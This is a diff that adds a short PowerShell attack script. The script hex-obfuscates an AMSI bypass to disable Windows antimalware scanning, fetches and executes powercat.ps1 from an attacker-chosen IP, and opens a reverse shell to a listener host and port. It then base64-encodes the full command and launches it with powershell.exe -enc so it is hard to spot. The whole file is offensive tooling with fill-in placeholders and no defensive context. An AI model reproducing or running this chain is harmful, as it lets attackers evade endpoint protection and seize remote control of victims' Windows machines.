@@ -1,0 +1,16 @@
+# Below are the phases with required information, if you continue with "powercat" as the payload
+# IP hosting payload
+# LHost 
+# LPort
+# Shell is either cmd.exe or powershell.exe
+
+
+# [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true); IEX (new-object system.net.webclient).DownloadString('http://{IP}/powercat.ps1'); powercat -c {LHost} -p {LPort} -e {cmd.exe|powershell.exe}
+
+$Text = '[Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 74 69 6C 73".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result=$result+$_};$result)).GetField($("61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64".Split(" ")|forEach{[char]([convert]::toint16($_,16))}|forEach{$result2=$result2+$_};$result2),'NonPublic,Static').SetValue($null,$true); IEX (new-object system.net.webclient).DownloadString('http://{IP}/powercat.ps1'); powercat -c {LHost} -p {LPort} -e {cmd.exe|powershell.exe}'
+
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+$EncodedText = [Convert]::ToBase64String($Bytes)
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc $EncodedText
